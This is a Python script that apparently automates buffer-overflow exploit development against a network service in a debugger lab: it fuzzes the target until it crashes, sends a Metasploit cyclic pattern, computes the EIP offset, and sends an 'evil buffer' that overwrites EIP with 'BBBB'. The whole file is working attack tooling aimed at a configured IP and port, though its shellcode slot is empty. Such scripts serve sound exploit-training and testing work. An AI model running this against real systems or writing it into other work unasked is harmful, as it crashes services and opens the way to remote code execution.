#!/usr/bin/env python3

import socket, time, sys, fcntl, struct
import os
from CONFIG import ip,port,prefix



print('Sending string set to '+ str(prefix) + "AAAAAAAAAAAAAA......")

timeout = 5
		
def generate_BBBB():
	entry = input("Now restart Immunity and press 'y' to continue: ")
	if entry != '':
		
		overflow = "A" * offset
		retn = "BBBB"
		padding = ""
		payload = ""  
		postfix = ""
		
		buffer = prefix + overflow + retn + padding + payload + postfix

		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

		try:
		  s.connect((ip, port))
		  print("Sending evil buffer...")
		  s.send(bytes(buffer + "\r\n", "latin-1"))
		  print("Done!")
		  print("Check your EIP value it should be '42424242'")
		  s.close()

		except:
		  pass
		sys.exit(0)

def pattern_create():
	global offset
	offset = 0
	overflow = "A" * offset
	retn = ""
	padding = ""
	payload = str(os.popen('/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l ' + str(crash)).read())
	postfix = ""

	buffer = prefix + overflow + retn + padding + payload + postfix

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
	  s.connect((ip, port))
	  print("Sending evil buffer...")
	  s.send(bytes(buffer + "\r\n", "latin-1"))
	  print("Done!")
	  s.close()
	  entry = input('Enter the value of EIP: ')
	  #if entry != '':
	  os.system('/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q '+str(entry))
	  global ofs
	  ofs = os.popen('/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q '+str(entry)).read()
	  keyword = 'offset'
	  before_keyword, keyword, after_keyword = ofs.partition(keyword)
	  before_keywor, keywor, after_keywor = after_keyword.partition('\n')
	  
	  offset = int(before_keywor.strip())

	  
	except:
	  pass
	generate_BBBB()
	  
	
  
def fuzz():
	string = prefix + "A" * 100

	while True:
	  try:
	    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
	      s.settimeout(timeout)
	      s.connect((ip, port))
	      s.recv(1024)
	      #print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
	      s.send(bytes(string, "latin-1"))
	      s.recv(1024)
	  except:
	    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
	    global crash
	    crash = len(string) - len(prefix)
	    print(crash)
	    s.close()
	    
	    entry = input("Now restart Immunity and press 'y' to continue: ")
	    if entry == 'y' or entry == 'Y':
	    	pattern_create()
	    #sys.exit(0)
	  string += 100 * "A"
	  time.sleep(1)
fuzz()  
  


	



